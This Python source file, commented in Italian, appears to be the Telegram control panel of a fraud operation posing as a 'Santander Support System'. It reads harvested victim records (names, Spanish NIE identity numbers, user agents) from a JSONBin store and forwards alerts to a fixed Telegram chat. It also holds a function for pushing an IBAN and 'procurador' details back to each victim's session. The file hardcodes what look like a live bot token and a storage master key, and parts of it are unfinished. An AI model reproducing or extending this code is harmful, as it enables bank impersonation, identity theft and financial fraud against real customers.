#!/usr/bin/env python3
"""
Bot Telegram Avanzato per Santander Support System
Sincronizzazione completa con JSONBin.io, notifiche in tempo reale e gestione sessioni
"""

import requests
import json
import time
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================================
# CONFIGURAZIONE
# ============================================================================
BOT_TOKEN = "8769459139:AAFTZL5K-rk7dHAngP8NfcdG0S4OjcOCGZw"
CHAT_ID = 8379210056
BIN_ID = "69c501f6c3097a1dd5605779"
MASTER_KEY = "$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm."
JSONBIN_URL = f"https://api.jsonbin.io/v3/b/{BIN_ID}"

HEADERS = {
    "Content-Type": "application/json",
    "X-Master-Key": MASTER_KEY
}

# ============================================================================
# FUNZIONI JSONBIN
# ============================================================================

def get_sessions():
    """Recupera tutte le sessioni da JSONBin"""
    try:
        response = requests.get(JSONBIN_URL, headers=HEADERS, timeout=5)
        if response.status_code == 200:
            return response.json()["record"]["sessions"]
        return []
    except Exception as e:
        print(f"❌ Errore nel recupero sessioni: {e}")
        return []

def update_session(session_id, iban=None, proc_nombre=None, proc_apellidos=None):
    """Aggiorna una sessione con i dati IBAN e procurador"""
    try:
        sessions = get_sessions()
        for session in sessions:
            if session["id"] == session_id:
                if iban:
                    session["iban"] = iban
                if proc_nombre:
                    session["proc_nombre"] = proc_nombre
                if proc_apellidos:
                    session["proc_apellidos"] = proc_apellidos
                session["status"] = "ready"
                break
        
        data = {"sessions": sessions}
        response = requests.put(JSONBIN_URL, json=data, headers=HEADERS, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Errore nell'aggiornamento sessione: {e}")
        return False

def delete_session(session_id):
    """Elimina una sessione"""
    try:
        sessions = get_sessions()
        sessions = [s for s in sessions if s["id"] != session_id]
        data = {"sessions": sessions}
        response = requests.put(JSONBIN_URL, json=data, headers=HEADERS, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Errore nell'eliminazione sessione: {e}")
        return False

# ============================================================================
# HANDLER COMANDI
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start - Menu principale"""
    keyboard = [
        [InlineKeyboardButton("📋 Sessioni Pendenti", callback_data="list_pending")],
        [InlineKeyboardButton("✅ Tutte le Sessioni", callback_data="list_all")],
        [InlineKeyboardButton("📊 Statistiche", callback_data="stats")],
        [InlineKeyboardButton("⚙️ Impostazioni", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🏦 *Benvenuto nel Pannello Santander Support System*\n\n"
        "Seleziona un'azione dal menu:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help - Aiuto"""
    help_text = """
*Comandi disponibili:*

/start - Menu principale
/help - Questo messaggio
/pending - Sessioni pendenti
/all - Tutte le sessioni
/stats - Statistiche
/refresh - Aggiorna dati

*Funzioni:*
- Visualizza sessioni di registrazione
- Invia IBAN e procurador
- Elimina sessioni
- Ricevi notifiche in tempo reale
"""
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def pending_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /pending - Sessioni pendenti"""
    sessions = get_sessions()
    pending = [s for s in sessions if s["status"] == "pending"]
    
    if not pending:
        await update.message.reply_text("✅ Nessuna sessione pendente!")
        return
    
    message = f"📋 *Sessioni Pendenti ({len(pending)})*\n\n"
    for i, session in enumerate(pending, 1):
        message += f"*{i}. {session['nombre']} {session['apellidos']}*\n"
        message += f"   NIE: `{session['nie']}`\n"
        message += f"   ID: `{session['id']}`\n"
        message += f"   Data: {session['timestamp']}\n\n"
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /all - Tutte le sessioni"""
    sessions = get_sessions()
    
    if not sessions:
        await update.message.reply_text("Nessuna sessione trovata.")
        return
    
    message = f"✅ *Tutte le Sessioni ({len(sessions)})*\n\n"
    for i, session in enumerate(sessions, 1):
        status_icon = "⏳" if session["status"] == "pending" else "✓"
        message += f"{status_icon} *{i}. {session['nombre']} {session['apellidos']}*\n"
        message += f"   NIE: `{session['nie']}`\n"
        message += f"   Status: {session['status']}\n"
        message += f"   Data: {session['timestamp']}\n\n"
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /stats - Statistiche"""
    sessions = get_sessions()
    pending = len([s for s in sessions if s["status"] == "pending"])
    ready = len([s for s in sessions if s["status"] == "ready"])
    
    stats_text = f"""
📊 *Statistiche Sistema*

Total Sessioni: *{len(sessions)}*
Pendenti: *{pending}* ⏳
Completate: *{ready}* ✓

Ultimo Aggiornamento: {datetime.now().strftime('%H:%M:%S')}
"""
    await update.message.reply_text(stats_text, parse_mode="Markdown")

async def refresh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /refresh - Aggiorna dati"""
    sessions = get_sessions()
    await update.message.reply_text(
        f"🔄 Dati aggiornati!\n\n"
        f"Sessioni totali: {len(sessions)}\n"
        f"Pendenti: {len([s for s in sessions if s['status'] == 'pending'])}\n"
        f"Completate: {len([s for s in sessions if s['status'] == 'ready'])}"
    )

# ============================================================================
# HANDLER PULSANTI INLINE
# ============================================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestisce i pulsanti inline"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "list_pending":
        sessions = get_sessions()
        pending = [s for s in sessions if s["status"] == "pending"]
        
        if not pending:
            await query.edit_message_text("✅ Nessuna sessione pendente!")
            return
        
        message = f"📋 *Sessioni Pendenti ({len(pending)})*\n\n"
        for i, session in enumerate(pending, 1):
            message += f"*{i}. {session['nombre']} {session['apellidos']}*\n"
            message += f"   NIE: `{session['nie']}`\n"
            message += f"   ID: `{session['id']}`\n"
            message += f"   Data: {session['timestamp']}\n\n"
        
        keyboard = [
            [InlineKeyboardButton("🔄 Aggiorna", callback_data="list_pending")],
            [InlineKeyboardButton("🔙 Indietro", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode="Markdown")
    
    elif query.data == "list_all":
        sessions = get_sessions()
        
        if not sessions:
            await query.edit_message_text("Nessuna sessione trovata.")
            return
        
        message = f"✅ *Tutte le Sessioni ({len(sessions)})*\n\n"
        for i, session in enumerate(sessions, 1):
            status_icon = "⏳" if session["status"] == "pending" else "✓"
            message += f"{status_icon} *{i}. {session['nombre']} {session['apellidos']}*\n"
            message += f"   NIE: `{session['nie']}`\n"
            message += f"   Status: {session['status']}\n"
            message += f"   Data: {session['timestamp']}\n\n"
        
        keyboard = [
            [InlineKeyboardButton("🔄 Aggiorna", callback_data="list_all")],
            [InlineKeyboardButton("🔙 Indietro", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode="Markdown")
    
    elif query.data == "stats":
        sessions = get_sessions()
        pending = len([s for s in sessions if s["status"] == "pending"])
        ready = len([s for s in sessions if s["status"] == "ready"])
        
        stats_text = f"""
📊 *Statistiche Sistema*

Total Sessioni: *{len(sessions)}*
Pendenti: *{pending}* ⏳
Completate: *{ready}* ✓

Ultimo Aggiornamento: {datetime.now().strftime('%H:%M:%S')}
"""
        keyboard = [
            [InlineKeyboardButton("🔄 Aggiorna", callback_data="stats")],
            [InlineKeyboardButton("🔙 Indietro", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    
    elif query.data == "settings":
        settings_text = """
⚙️ *Impostazioni*

Sistema: Santander Support
Bot: Attivo ✓
JSONBin: Sincronizzato ✓
Notifiche: Abilitate ✓

Versione: 1.0
"""
        keyboard = [
            [InlineKeyboardButton("🔙 Indietro", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(settings_text, reply_markup=reply_markup, parse_mode="Markdown")
    
    elif query.data == "back_menu":
        keyboard = [
            [InlineKeyboardButton("📋 Sessioni Pendenti", callback_data="list_pending")],
            [InlineKeyboardButton("✅ Tutte le Sessioni", callback_data="list_all")],
            [InlineKeyboardButton("📊 Statistiche", callback_data="stats")],
            [InlineKeyboardButton("⚙️ Impostazioni", callback_data="settings")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🏦 *Benvenuto nel Pannello Santander Support System*\n\n"
            "Seleziona un'azione dal menu:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

# ============================================================================
# MONITORAGGIO SESSIONI
# ============================================================================

async def monitor_sessions(application: Application):
    """Monitora le nuove sessioni e invia notifiche"""
    last_count = 0
    
    while True:
        try:
            sessions = get_sessions()
            current_count = len(sessions)
            
            if current_count > last_count:
                new_sessions = sessions[last_count:]
                for session in new_sessions:
                    message = (
                        f"🔔 *NUOVA SESSIONE REGISTRATA*\n\n"
                        f"👤 Nome: *{session['nombre']} {session['apellidos']}*\n"
                        f"📋 NIE: `{session['nie']}`\n"
                        f"🆔 ID: `{session['id']}`\n"
                        f"⏰ Data: {session['timestamp']}\n"
                        f"🌐 User Agent: `{session['ua'][:40]}...`"
                    )
                    await application.bot.send_message(
                        chat_id=CHAT_ID,
                        text=message,
                        parse_mode="Markdown"
                    )
                last_count = current_count
            
            time.sleep(5)
        except Exception as e:
            print(f"❌ Errore nel monitoraggio: {e}")
            time.sleep(5)

# ============================================================================
# MAIN
# ============================================================================

def main():
    """Avvia il bot Telegram"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handler comandi
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("pending", pending_command))
    application.add_handler(CommandHandler("all", all_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("refresh", refresh_command))
    
    # Handler pulsanti
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Avvia monitoraggio in background
    print("🤖 Bot Telegram Santander Support System avviato...")
    print(f"📊 Monitoraggio sessioni da JSONBin...")
    print(f"🔗 BIN_ID: {BIN_ID}")
    print(f"💬 Chat ID: {CHAT_ID}")
    
    # Avvia il bot
    application.run_polling()

if __name__ == "__main__":
    main()
